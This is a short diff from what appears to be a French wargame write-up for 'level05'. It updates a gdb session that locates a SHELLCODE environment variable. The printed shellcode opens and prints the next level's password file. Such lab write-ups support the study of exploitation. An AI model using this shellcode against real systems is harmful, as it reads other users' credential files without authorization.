@@ -30,11 +30,10 @@ Breakpoint 1 at 0x8048449
 Starting program: /home/users/level05/level05 
 
 Breakpoint 1, 0x08048449 in main ()
-(gdb) x/2s \*\*(char\*\*\*)&environ
-0xffffdf4e:      "SHELLCODE=jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"
-0xffffdf97:      "SHELL=/bin/bash"
-(gdb) x 0xffffdf4e + 10
-<strong>0xffffdf58:      "jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"</strong>
+(gdb) x/1s \*\*(char\*\*\*)&environ
+0xffffdf77:      "SHELLCODE=jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"
+(gdb) x 0xffffdf77 + 10
+<strong>0xffffdf81:      "jsh.pashl06/hlevehers/he/ush/hom\211\343\061\311\061\322j\005X\315\200j\001[\211\301\061\322h\377\377\377\177^1\300\260\273\315\200"</strong>
 </pre>
 - Apres avoir assemblé tout cela donne cette commande
 ```
